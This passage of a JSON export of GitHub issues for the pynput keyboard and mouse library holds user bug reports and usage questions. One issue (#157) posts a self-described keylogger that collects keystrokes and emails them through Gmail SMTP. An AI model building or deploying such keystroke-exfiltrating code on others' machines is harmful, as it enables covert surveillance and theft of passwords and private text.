ctrl+alt+t to open the terminal window, the script suddenly stops all GPIO input. Am I doing something wrong? Script below:\r\n\r\n`import RPi.GPIO as GPIO\r\nfrom pynput.keyboard import Key, Controller\r\n\r\nkeyboard = Controller()\r\n\r\ndef startcall(channel): # this breaks the script\r\n    with keyboard.pressed(Key.ctrl):\r\n        with keyboard.pressed(Key.alt):\r\n        keyboard.press('t')\r\n        keyboard.release('t')\r\n    time.sleep(2)\r\n    keyboard.type('chromium-browser')\r\n    keyboard.press(Key.enter)\r\n    keyboard.release(Key.enter)\r\n    \r\ndef endvideo(channel): # I can press this all I want and it keeps running.\r\n    keyboard.press(Key.alt)\r\n    keyboard.press(Key.f4)\r\n    keyboard.release(Key.f4)\r\n    keyboard.release(Key.alt)\r\n\r\nGPIO.setmode(GPIO.BOARD)\r\nGPIO.setup(10, GPIO.IN, pull_up_down=GPIO.PUD_DOWN)\r\nGPIO.add_event_detect(10,GPIO.RISING,callback=startcall)\r\nGPIO.setup(8, GPIO.IN, pull_up_down=GPIO.PUD_DOWN)\r\nGPIO.add_event_detect(8,GPIO.RISING,callback=endvideo)`", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/170", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/170/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/170/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/170/events", "html_url": "https://github.com/moses-palmer/pynput/issues/170", "id": 465571420, "node_id": "MDU6SXNzdWU0NjU1NzE0MjA=", "number": 170, "title": "Suppressing only hotkey events on Windows", "user": {"login": "wastedepository", "id": 10669223, "node_id": "MDQ6VXNlcjEwNjY5MjIz", "avatar_url": "https://avatars3.githubusercontent.com/u/10669223?v=4", "gravatar_id": "", "url": "https://api.github.com/users/wastedepository", "html_url": "https://github.com/wastedepository", "followers_url": "https://api.github.com/users/wastedepository/followers", "following_url": "https://api.github.com/users/wastedepository/following{/other_user}", "gists_url": "https://api.github.com/users/wastedepository/gists{/gist_id}", "starred_url": "https://api.github.com/users/wastedepository/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/wastedepository/subscriptions", "organizations_url": "https://api.github.com/users/wastedepository/orgs", "repos_url": "https://api.github.com/users/wastedepository/repos", "events_url": "https://api.github.com/users/wastedepository/events{/privacy}", "received_events_url": "https://api.github.com/users/wastedepository/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 16, "created_at": "2019-07-09T05:06:30Z", "updated_at": "2020-08-01T19:04:43Z", "closed_at": "2019-07-24T11:12:05Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm on Windows. I want to use pynput to establish a hotkey (say, F1) while the foreground window is another program (say, Notepad). When the user presses F1, I do not want the foreground program to find out about that key press. But I want the Python script to be aware that F1 was pressed. If I press any other key, Notepad should receive the key as usual.\r\n\r\nThere are multiple threads claiming this is possible using the pynput.keyboard.Listener.\\_\\_init__() win32_event_filter argument, possibly in combination with pynput.keyboard.Listener.suppress_event():\r\nhttps://github.com/moses-palmer/pynput/issues/163\r\nhttps://github.com/moses-palmer/pynput/issues/70\r\nhttps://github.com/moses-palmer/pynput/issues/47\r\n\r\nAfter messing with this for two hours, I have no idea how to make it work. How is win32_event_filter supposed to help suppress hotkeys for the foreground window, while still having those keys be processed by the Python program?\r\n\r\nThe callback win32_event_filter sets up doesn't even have access to Listener.suppress_event(). Even if you use global variables to give it access, calling listener.suppress_event() from the win32_event_filter callback just causes the on_press and on_release callbacks to never be initiated.\r\n\r\n(I also failed to set up a subclass which inherits from Listener and overwrites the suppress property inherited from AbstractListener.)\r\n\r\n\r\nWhat is the correct way to do this? Maybe I am supposed to use *only* the win32_event_filter callback, and not use on_press or on_release at all?\r\n\r\nI include this skeleton program to show the situation:\r\n\r\n```\r\n# TODO: This should not send F1 to the foreground window (Notepad), but should still print out \"on press\" for F1.\r\n\r\nfrom pynput import keyboard\r\n\r\ndef on_press(key):\r\n    print('on press', key)\r\n\r\ndef on_release(key):\r\n    print('on release', key)\r\n\r\ndef win32_event_filter(msg, data):\r\n    print(msg, data)\r\n\r\nif __name__ == '__main__':\r\n    # Set up keyboard shortcuts.\r\n    with keyboard.Listener(on_press=on_press,\r\n                           on_release=on_release,\r\n                           win32_event_filter=win32_event_filter,\r\n                           suppress=False) as listener:\r\n        listener.join()\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/169", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/169/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/169/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/169/events", "html_url": "https://github.com/moses-palmer/pynput/issues/169", "id": 462805281, "node_id": "MDU6SXNzdWU0NjI4MDUyODE=", "number": 169, "title": "Some combinations with Shift key do not work on Windows 7.", "user": {"login": "tuessetr", "id": 52419579, "node_id": "MDQ6VXNlcjUyNDE5NTc5", "avatar_url": "https://avatars1.githubusercontent.com/u/52419579?v=4", "gravatar_id": "", "url": "https://api.github.com/users/tuessetr", "html_url": "https://github.com/tuessetr", "followers_url": "https://api.github.com/users/tuessetr/followers", "following_url": "https://api.github.com/users/tuessetr/following{/other_user}", "gists_url": "https://api.github.com/users/tuessetr/gists{/gist_id}", "starred_url": "https://api.github.com/users/tuessetr/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/tuessetr/subscriptions", "organizations_url": "https://api.github.com/users/tuessetr/orgs", "repos_url": "https://api.github.com/users/tuessetr/repos", "events_url": "https://api.github.com/users/tuessetr/events{/privacy}", "received_events_url": "https://api.github.com/users/tuessetr/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-07-01T16:27:17Z", "updated_at": "2019-11-28T16:06:07Z", "closed_at": "2019-11-28T16:06:07Z", "author_association": "NONE", "active_lock_reason": null, "body": "For example Shift + Arrows do not work. I think that the \\keyboard\\_win32.py KeyCode class needs to be modified: variable \"extendedkey\" that stores 1 if key virtualcode or scancode in set of keys that has the prefix code E0 (at least) or 0 if it does not. and dwFlags line might look like this \"dwFlags=flags | (KEYBDINPUT.KEYUP if not is_press else 0) **| extendedkey**\". This works for Shift + Arrows, has not tested other combinations.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/168", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/168/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/168/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/168/events", "html_url": "https://github.com/moses-palmer/pynput/issues/168", "id": 462293573, "node_id": "MDU6SXNzdWU0NjIyOTM1NzM=", "number": 168, "title": "How to combine ctrl+c on pynput", "user": {"login": "WhatEverboutME", "id": 52006748, "node_id": "MDQ6VXNlcjUyMDA2NzQ4", "avatar_url": "https://avatars3.githubusercontent.com/u/52006748?v=4", "gravatar_id": "", "url": "https://api.github.com/users/WhatEverboutME", "html_url": "https://github.com/WhatEverboutME", "followers_url": "https://api.github.com/users/WhatEverboutME/followers", "following_url": "https://api.github.com/users/WhatEverboutME/following{/other_user}", "gists_url": "https://api.github.com/users/WhatEverboutME/gists{/gist_id}", "starred_url": "https://api.github.com/users/WhatEverboutME/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/WhatEverboutME/subscriptions", "organizations_url": "https://api.github.com/users/WhatEverboutME/orgs", "repos_url": "https://api.github.com/users/WhatEverboutME/repos", "events_url": "https://api.github.com/users/WhatEverboutME/events{/privacy}", "received_events_url": "https://api.github.com/users/WhatEverboutME/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-06-29T11:28:08Z", "updated_at": "2019-11-29T18:44:04Z", "closed_at": "2019-11-29T18:44:04Z", "author_association": "NONE", "active_lock_reason": null, "body": "", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/166", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/166/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/166/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/166/events", "html_url": "https://github.com/moses-palmer/pynput/issues/166", "id": 460901665, "node_id": "MDU6SXNzdWU0NjA5MDE2NjU=", "number": 166, "title": "Mouse listener to button click doesn't work when active process is running.", "user": {"login": "DanielHammerin", "id": 11715800, "node_id": "MDQ6VXNlcjExNzE1ODAw", "avatar_url": "https://avatars2.githubusercontent.com/u/11715800?v=4", "gravatar_id": "", "url": "https://api.github.com/users/DanielHammerin", "html_url": "https://github.com/DanielHammerin", "followers_url": "https://api.github.com/users/DanielHammerin/followers", "following_url": "https://api.github.com/users/DanielHammerin/following{/other_user}", "gists_url": "https://api.github.com/users/DanielHammerin/gists{/gist_id}", "starred_url": "https://api.github.com/users/DanielHammerin/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/DanielHammerin/subscriptions", "organizations_url": "https://api.github.com/users/DanielHammerin/orgs", "repos_url": "https://api.github.com/users/DanielHammerin/repos", "events_url": "https://api.github.com/users/DanielHammerin/events{/privacy}", "received_events_url": "https://api.github.com/users/DanielHammerin/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-06-26T10:56:46Z", "updated_at": "2019-06-26T15:22:28Z", "closed_at": "2019-06-26T15:22:27Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm using pynput to automate some things. \r\n\r\nI have a function:\r\n\r\n    def on_click(x, y, button, pressed):\r\n        # If right-click, stop execution\r\n        if button == Button.right and pressed:\r\n            raise KeyboardInterrupt\r\n        # If left-click start execution\r\n        if button == Button.left and pressed:\r\n            run(x, y)\r\n\r\nIf I left click it starts the script and if I right click it stops.\r\nHowever, if I start and it goes into my run() where I run a while True, the listener doesn't pick up the right-click.\r\nIt does the same if i invert the buttons.\r\nIsn't the listener always listening or am I missing something here?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/164", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/164/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/164/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/164/events", "html_url": "https://github.com/moses-palmer/pynput/issues/164", "id": 451401721, "node_id": "MDU6SXNzdWU0NTE0MDE3MjE=", "number": 164, "title": "a lapse in doc", "user": {"login": "redstoneleo", "id": 5896180, "node_id": "MDQ6VXNlcjU4OTYxODA=", "avatar_url": "https://avatars0.githubusercontent.com/u/5896180?v=4", "gravatar_id": "", "url": "https://api.github.com/users/redstoneleo", "html_url": "https://github.com/redstoneleo", "followers_url": "https://api.github.com/users/redstoneleo/followers", "following_url": "https://api.github.com/users/redstoneleo/following{/other_user}", "gists_url": "https://api.github.com/users/redstoneleo/gists{/gist_id}", "starred_url": "https://api.github.com/users/redstoneleo/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/redstoneleo/subscriptions", "organizations_url": "https://api.github.com/users/redstoneleo/orgs", "repos_url": "https://api.github.com/users/redstoneleo/repos", "events_url": "https://api.github.com/users/redstoneleo/events{/privacy}", "received_events_url": "https://api.github.com/users/redstoneleo/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-06-03T10:15:46Z", "updated_at": "2019-06-17T16:16:29Z", "closed_at": "2019-06-17T16:16:28Z", "author_association": "NONE", "active_lock_reason": null, "body": "In the last section of code here\r\nhttps://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard\r\n\r\nnot mouse.Listener, but keyboard.Listener", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/163", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/163/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/163/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/163/events", "html_url": "https://github.com/moses-palmer/pynput/issues/163", "id": 451280700, "node_id": "MDU6SXNzdWU0NTEyODA3MDA=", "number": 163, "title": "The `suppress `parameter  should block all input events from being passed to the rest of the system.", "user": {"login": "redstoneleo", "id": 5896180, "node_id": "MDQ6VXNlcjU4OTYxODA=", "avatar_url": "https://avatars0.githubusercontent.com/u/5896180?v=4", "gravatar_id": "", "url": "https://api.github.com/users/redstoneleo", "html_url": "https://github.com/redstoneleo", "followers_url": "https://api.github.com/users/redstoneleo/followers", "following_url": "https://api.github.com/users/redstoneleo/following{/other_user}", "gists_url": "https://api.github.com/users/redstoneleo/gists{/gist_id}", "starred_url": "https://api.github.com/users/redstoneleo/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/redstoneleo/subscriptions", "organizations_url": "https://api.github.com/users/redstoneleo/orgs", "repos_url": "https://api.github.com/users/redstoneleo/repos", "events_url": "https://api.github.com/users/redstoneleo/events{/privacy}", "received_events_url": "https://api.github.com/users/redstoneleo/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-06-03T03:43:50Z", "updated_at": "2019-06-26T15:30:37Z", "closed_at": "2019-06-26T15:30:37Z", "author_association": "NONE", "active_lock_reason": null, "body": "My program want to listen to key combination Alt+Z and  block the key combination event passed to the rest of the system, so I set suppress=True , but pynput also blocked Ctrl +C.\r\nMy suggestion is the `suppress `parameter of `pynput.keyboard.Listener(on_press=None, on_release=None, suppress=False, **kwargs)`  once set to true  should not block all input events from being passed to the rest of the system, but should only block the specified  key combination events. \r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/162", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/162/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/162/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/162/events", "html_url": "https://github.com/moses-palmer/pynput/issues/162", "id": 449106488, "node_id": "MDU6SXNzdWU0NDkxMDY0ODg=", "number": 162, "title": "No windows key?", "user": {"login": "Albatrossdk", "id": 51111940, "node_id": "MDQ6VXNlcjUxMTExOTQw", "avatar_url": "https://avatars2.githubusercontent.com/u/51111940?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Albatrossdk", "html_url": "https://github.com/Albatrossdk", "followers_url": "https://api.github.com/users/Albatrossdk/followers", "following_url": "https://api.github.com/users/Albatrossdk/following{/other_user}", "gists_url": "https://api.github.com/users/Albatrossdk/gists{/gist_id}", "starred_url": "https://api.github.com/users/Albatrossdk/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Albatrossdk/subscriptions", "organizations_url": "https://api.github.com/users/Albatrossdk/orgs", "repos_url": "https://api.github.com/users/Albatrossdk/repos", "events_url": "https://api.github.com/users/Albatrossdk/events{/privacy}", "received_events_url": "https://api.github.com/users/Albatrossdk/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-05-28T07:30:33Z", "updated_at": "2019-09-24T20:52:23Z", "closed_at": "2019-09-24T20:52:23Z", "author_association": "NONE", "active_lock_reason": null, "body": "I honestly just dont know where to ask but is there no windows key in pynput if there is what is it called, if not is going to be added?\r\n(I know this isnt nesccesarily is an issue but i needed to ask)", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/161", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/161/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/161/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/161/events", "html_url": "https://github.com/moses-palmer/pynput/issues/161", "id": 448096824, "node_id": "MDU6SXNzdWU0NDgwOTY4MjQ=", "number": 161, "title": "can't type some key combinations such as some with 'shift' f.e. to obtain '\u00eb'", "user": {"login": "yasinkurt61", "id": 50987098, "node_id": "MDQ6VXNlcjUwOTg3MDk4", "avatar_url": "https://avatars2.githubusercontent.com/u/50987098?v=4", "gravatar_id": "", "url": "https://api.github.com/users/yasinkurt61", "html_url": "https://github.com/yasinkurt61", "followers_url": "https://api.github.com/users/yasinkurt61/followers", "following_url": "https://api.github.com/users/yasinkurt61/following{/other_user}", "gists_url": "https://api.github.com/users/yasinkurt61/gists{/gist_id}", "starred_url": "https://api.github.com/users/yasinkurt61/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/yasinkurt61/subscriptions", "organizations_url": "https://api.github.com/users/yasinkurt61/orgs", "repos_url": "https://api.github.com/users/yasinkurt61/repos", "events_url": "https://api.github.com/users/yasinkurt61/events{/privacy}", "received_events_url": "https://api.github.com/users/yasinkurt61/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-05-24T10:28:57Z", "updated_at": "2019-05-27T13:35:17Z", "closed_at": "2019-05-24T18:58:46Z", "author_association": "NONE", "active_lock_reason": null, "body": "When the keyboard listener is active, I can't type certain special characters anymore system wide.\r\nFor example I'm unable to type the character '\u00eb'.\r\n\r\nMy program is just for listening to key presses and log how many keys are pressed. \r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/160", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/160/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/160/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/160/events", "html_url": "https://github.com/moses-palmer/pynput/issues/160", "id": 447626884, "node_id": "MDU6SXNzdWU0NDc2MjY4ODQ=", "number": 160, "title": "[Windows] Having issues with (Key.shift) in some shortcuts", "user": {"login": "caiobsilva", "id": 42775945, "node_id": "MDQ6VXNlcjQyNzc1OTQ1", "avatar_url": "https://avatars3.githubusercontent.com/u/42775945?v=4", "gravatar_id": "", "url": "https://api.github.com/users/caiobsilva", "html_url": "https://github.com/caiobsilva", "followers_url": "https://api.github.com/users/caiobsilva/followers", "following_url": "https://api.github.com/users/caiobsilva/following{/other_user}", "gists_url": "https://api.github.com/users/caiobsilva/gists{/gist_id}", "starred_url": "https://api.github.com/users/caiobsilva/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/caiobsilva/subscriptions", "organizations_url": "https://api.github.com/users/caiobsilva/orgs", "repos_url": "https://api.github.com/users/caiobsilva/repos", "events_url": "https://api.github.com/users/caiobsilva/events{/privacy}", "received_events_url": "https://api.github.com/users/caiobsilva/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-05-23T12:16:52Z", "updated_at": "2019-05-24T19:41:01Z", "closed_at": "2019-05-24T19:41:01Z", "author_association": "NONE", "active_lock_reason": null, "body": "I'm writing a simple script to manage some screens. At one point of it, I want to move an image to the second screen and make it fullscreen, and so I use\r\n```\r\nkeyboard.press(Key.cmd)\r\nkeyboard.press(Key.shift)\r\nkeyboard.press(Key.right)\r\nkeyboard.release(Key.cmd)\r\nkeyboard.release(Key.shift)\r\nkeyboard.release(Key.right)\r\ntime.sleep(1)\r\n```\r\nand\r\n```\r\nkeyboard.press(Key.cmd)\r\nkeyboard.press(Key.shift)\r\nkeyboard.press(Key.enter)\r\nkeyboard.release(Key.cmd)\r\nkeyboard.release(Key.shift)\r\nkeyboard.release(Key.enter)\r\n```\r\n\r\nThe first function doesn't work as expected. Instead of moving the window to the second screen, it snaps it to the right half of the first screen, as if the keys cmd + right were being pressed. The second function, however, works just fine. Any suggestion on what may be causing this?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/159", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/159/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/159/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/159/events", "html_url": "https://github.com/moses-palmer/pynput/issues/159", "id": 444964409, "node_id": "MDU6SXNzdWU0NDQ5NjQ0MDk=", "number": 159, "title": "Suppress controller output to listener?", "user": {"login": "DeeJayhX", "id": 1514573, "node_id": "MDQ6VXNlcjE1MTQ1NzM=", "avatar_url": "https://avatars1.githubusercontent.com/u/1514573?v=4", "gravatar_id": "", "url": "https://api.github.com/users/DeeJayhX", "html_url": "https://github.com/DeeJayhX", "followers_url": "https://api.github.com/users/DeeJayhX/followers", "following_url": "https://api.github.com/users/DeeJayhX/following{/other_user}", "gists_url": "https://api.github.com/users/DeeJayhX/gists{/gist_id}", "starred_url": "https://api.github.com/users/DeeJayhX/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/DeeJayhX/subscriptions", "organizations_url": "https://api.github.com/users/DeeJayhX/orgs", "repos_url": "https://api.github.com/users/DeeJayhX/repos", "events_url": "https://api.github.com/users/DeeJayhX/events{/privacy}", "received_events_url": "https://api.github.com/users/DeeJayhX/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-05-16T13:43:31Z", "updated_at": "2019-05-27T19:17:44Z", "closed_at": "2019-05-24T19:58:18Z", "author_association": "NONE", "active_lock_reason": null, "body": "I am using pynput to send rapid keystrokes for a particular purpose. I am also using a non-blocking listener to wait for a hotkey to end this function. The problem is that the listener is responding to the controller's output. It causes the system to hang as the CPU threads are quickly filled up by responding to each one of these keystrokes in a long series of strings being output.\r\n\r\nIs there a way to suppress the controller's output to the listener, or is this not possible because the listener is grabbing information from a Window's messagepump and output from the controller is going through that?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/158", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/158/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/158/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/158/events", "html_url": "https://github.com/moses-palmer/pynput/issues/158", "id": 442107867, "node_id": "MDU6SXNzdWU0NDIxMDc4Njc=", "number": 158, "title": "determine whether the WM_KEYDOWN message indicates the first down transition or a repeated down transition", "user": {"login": "redstoneleo", "id": 5896180, "node_id": "MDQ6VXNlcjU4OTYxODA=", "avatar_url": "https://avatars0.githubusercontent.com/u/5896180?v=4", "gravatar_id": "", "url": "https://api.github.com/users/redstoneleo", "html_url": "https://github.com/redstoneleo", "followers_url": "https://api.github.com/users/redstoneleo/followers", "following_url": "https://api.github.com/users/redstoneleo/following{/other_user}", "gists_url": "https://api.github.com/users/redstoneleo/gists{/gist_id}", "starred_url": "https://api.github.com/users/redstoneleo/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/redstoneleo/subscriptions", "organizations_url": "https://api.github.com/users/redstoneleo/orgs", "repos_url": "https://api.github.com/users/redstoneleo/repos", "events_url": "https://api.github.com/users/redstoneleo/events{/privacy}", "received_events_url": "https://api.github.com/users/redstoneleo/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-05-09T08:14:38Z", "updated_at": "2019-05-24T19:58:37Z", "closed_at": "2019-05-24T19:58:37Z", "author_association": "NONE", "active_lock_reason": null, "body": "According  to the [MSDN doc](https://docs.microsoft.com/zh-cn/windows/desktop/inputdev/wm-keydown), \r\n> If the keystroke is held long enough, multiple messages are sent.\r\n\r\n> Because of the autorepeat feature, more than one WM_KEYDOWN message may be posted before a WM_KEYUP message is posted. The previous key state (bit 30) can be used to determine whether the WM_KEYDOWN message indicates the first down transition or a repeated down transition.\r\n\r\nI wonder how to get the lParam parameter to implement the feature ?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/157", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/157/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/157/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/157/events", "html_url": "https://github.com/moses-palmer/pynput/issues/157", "id": 441487378, "node_id": "MDU6SXNzdWU0NDE0ODczNzg=", "number": 157, "title": "Heavy delay input on some specific code parts ", "user": {"login": "vitormndc", "id": 34409244, "node_id": "MDQ6VXNlcjM0NDA5MjQ0", "avatar_url": "https://avatars0.githubusercontent.com/u/34409244?v=4", "gravatar_id": "", "url": "https://api.github.com/users/vitormndc", "html_url": "https://github.com/vitormndc", "followers_url": "https://api.github.com/users/vitormndc/followers", "following_url": "https://api.github.com/users/vitormndc/following{/other_user}", "gists_url": "https://api.github.com/users/vitormndc/gists{/gist_id}", "starred_url": "https://api.github.com/users/vitormndc/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/vitormndc/subscriptions", "organizations_url": "https://api.github.com/users/vitormndc/orgs", "repos_url": "https://api.github.com/users/vitormndc/repos", "events_url": "https://api.github.com/users/vitormndc/events{/privacy}", "received_events_url": "https://api.github.com/users/vitormndc/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-05-07T23:30:10Z", "updated_at": "2019-05-24T20:07:45Z", "closed_at": "2019-05-24T20:07:44Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, I'm writing a keylogger as one of my first projects, everything works fine until I try to send the data thru email at this point the input from the keyboard gets heavily delayed(almost like slow motion). I tried to pause the listener, but it made no difference \r\n\r\n```\r\nfrom pynput.keyboard import Listener\r\nimport smtplib, ssl\r\n\r\n\r\n\r\ndef send_mail():\r\n    password = input(\"password=\")\r\n    with smtplib.SMTP_SSL(\"smtp.gmail.com\", 465, context=ssl.create_default_context()) as server:\r\n        server.login(\"sender@gmail\", password)\r\n        server.sendmail(\"sender@gmail.com\", \"reciever@gmail.com\", string)\r\n        server.quit()\r\n\r\n\r\ndef on_press(key):\r\n   #gather data and save it to _list\r\n\r\n    if len(_list) > 100:\r\n        global string\r\n        for i in _list:\r\n            string += i\r\n        send_mail()\r\n\r\n\r\nwith Listener(on_press=on_press) as listener:\r\n    listener.join()\r\n\r\n```\r\n\r\n\r\nThe script gathers 100 keys then store it in a string and send it thru email. The input lag begun as soon as send_mail() is called.\r\nSorry for any typo or hard to understand explanation ", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/moses-palmer/pynput/issues/156", "repository_url": "https://api.github.com/repos/moses-palmer/pynput", "labels_url": "https://api.github.com/repos/moses-palmer/pynput/issues/156/labels{/name}", "comments_url": "https://api.github.com/repos/moses-palmer/pynput/issues/156/comments", "events_url": "https://api.github.com/repos/moses-palmer/pynput/issues/156/events", "html_url": "https://github.com/moses-palmer/pynput/issues/156", "id": 440427989, "node_id": "MDU6SXNzdWU0NDA0Mjc5ODk=", "number": 156, "title": "Get an {'vk': 0, 'char': None} KeyCode when press multiple keys in the same time", "user": {"login": "Warren-Wong", "id": 4443337, "node_id": "MDQ6VXNlcjQ0NDMzMzc=", "avatar_url": "https://avatars3.githubusercontent.com/u/4443337?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Warren-Wong", "html_url": "https://github.com/Warren-Wong", "followers_url": "https://api.github.com/users/Warren-Wong/followers", "following_url": "https://api.github.com/users/Warren-Wong/following{/other_user}", "gists_url": "https://api.github.com/users/Warren-Wong/gists{/gist_id}", "starred_url": "https://api.github.com/users/Warren-Wong/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Warren-Wong/subscriptions", "organizations_url": "https://api.github.com/users/Warren-Wong/orgs", "repos_url": "https://api.github.com/users/Warren-Wong/repos", "events_url": "https://api.github.com/users/Warren-Wong/events{/privacy}", "received_events_url": "https://api.github.com/users/Warren-Wong/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-05-05T10:20:24Z", "updated_at": "2019-05-24T20:11:11Z", "closed_at": "2019-05-24T20:11:10Z", "author_association": "NONE", "active_lock_reason": null, "body": "When put a \"sleep(3)\" in the on_press() keyboard callback, then press two keys, such as 'shift' and 'c' in the same time, wait, then press any other key, an abnormal KeyCode will be received.\r\nThe KeyCode is like: `{'vk': 0, 'char': None, 'is_dead': False, 'combining': None}`\r\n\r\nHaving some bug, then I finally located that problem. My program didn't use `sleep()`, but has a lot of works to do in the `on_press()` callback.\r\n\r\n### Test code:\r\n```\r\nfrom pynput.keyboard import Key, KeyCode, Controller, Listener\r\nfrom time import sleep\r\n\r\ndef on_press(key):\r\n    